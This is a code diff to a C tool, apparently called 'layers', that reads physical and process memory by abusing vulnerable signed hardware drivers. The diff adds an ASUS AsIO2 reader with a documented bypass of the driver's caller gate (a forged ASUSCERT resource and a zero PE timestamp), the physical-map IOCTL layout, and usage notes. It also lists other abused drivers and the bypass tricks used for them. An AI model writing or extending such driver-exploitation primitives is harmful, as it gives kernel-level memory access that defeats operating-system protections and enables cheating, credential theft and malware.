@@ -255,6 +255,42 @@ static int read_asupio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t siz
     return 1;
 }
 
+// ---- 取数层 provider: ASUS AsIO2 (gate bypass via ASUSCERT resource) ----
+// Device \\.\Asusgio2. Gate reads current process image PE, finds resource
+// "ASUSCERT" (size <=16), AES-128-encrypts the data and compares qword with
+// PE TimeDateStamp. We build layers_asio2.exe with:
+//   ASUSCERT data = AES_dec(0), PE TimeDateStamp = 0  -> gate passes.
+// Physical map IOCTL 0xA040A480 (64-bit struct 0x28):
+//   +0x00 u64 size; +0x08 u64 phys_start; +0x10 section_handle_out;
+//   +0x18 user_va_out.
+static int asio2_build_map_request(uint64_t pa, uint32_t size, uint8_t out[0x28]) {
+    if (!out || !size) return 0;
+    uint64_t page = pa & ~0xFFFull;
+    uint64_t end = pa + size;
+    uint64_t page_end = (end + 0xFFF) & ~0xFFFull;
+    uint64_t map_size = page_end - page;
+    if (map_size > 0x1000000) return 0;
+    memset(out, 0, 0x28);
+    *(uint64_t *)(out + 0x00) = map_size;   // size
+    *(uint64_t *)(out + 0x08) = page;       // physical start
+    *(uint64_t *)(out + 0x10) = 0;          // section handle out
+    *(uint64_t *)(out + 0x18) = 0;          // user VA out
+    return 1;
+}
+
+static int read_asio2(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint8_t req[0x28];
+    if (!asio2_build_map_request(pa, size, req)) return 0;
+    DWORD ret = 0;
+    if (!DeviceIoControl(r->dev, 0xA040A480u, req, sizeof(req), req, sizeof(req), &ret, NULL))
+        return 0;
+    uint64_t uva = *(uint64_t *)(req + 0x18);
+    if (uva < 0x10000) return 0;
+    memcpy(buf, (void *)(uintptr_t)(uva + (pa & 0xFFF)), size);
+    return 1;
+}
+
 static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
     memset(r, 0, sizeof(*r));
     r->dev = INVALID_HANDLE_VALUE;
@@ -319,8 +355,17 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
                              NULL, OPEN_EXISTING, 0, NULL);
         if (r->dev == INVALID_HANDLE_VALUE)
             fprintf(stderr, "[HINT] AsUpIO64 gate: run layers.exe renamed/copied as PEUPDATER.EXE\n");
+    } else if (_stricmp(kind, "asio2") == 0) {
+        r->name = "asio2";
+        r->mode = 8;
+        r->read = read_asio2;
+        r->dev = CreateFileA(device ? device : "\\\\.\\Asusgio2",
+                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, 0, NULL);
+        if (r->dev == INVALID_HANDLE_VALUE)
+            fprintf(stderr, "[HINT] AsIO2 gate: run bin\\layers_asio2.exe (ASUSCERT resource + timestamp 0)\n");
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -847,6 +892,14 @@ static int selftest_mock(void) {
                    *(uint32_t *)(map_req2 + 20) == 0x2000;
     check("取数层(fetcher)", "asupio64 cross-page map request (map size 0x2000)", ok_asup2);
 
+    // AsIO2 map request layout (offline, no driver): 0x28 struct, size/phys at 0/8
+    uint8_t asio2_req[0x28];
+    int ok_asio2 = asio2_build_map_request(0x12345678, 0x100, asio2_req) &&
+                   *(uint64_t *)(asio2_req + 0x00) == 0x1000 &&
+                   *(uint64_t *)(asio2_req + 0x08) == 0x12345000ull &&
+                   *(uint64_t *)(asio2_req + 0x18) == 0;
+    check("取数层(fetcher)", "asio2 map request layout (gate-bypass PE)", ok_asio2);
+
     // 定位层 alone (physical EPROCESS scan, no kernel reader)
     uint64_t located_cr3 = 0, eproc = 0;
     int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
@@ -938,15 +991,16 @@ static void usage(void) {
     printf("Usage:\n");
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --read-phys --pa <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
     printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
     printf("  note: --reader asupio64 requires layers.exe to be named PEUPDATER.EXE (AsUpIO64 gate)\n");
+    printf("  note: --reader asio2 requires bin\\layers_asio2.exe (ASUSCERT resource + timestamp 0 gate bypass)\n");
 }
 
 int main(int argc, char **argv) {
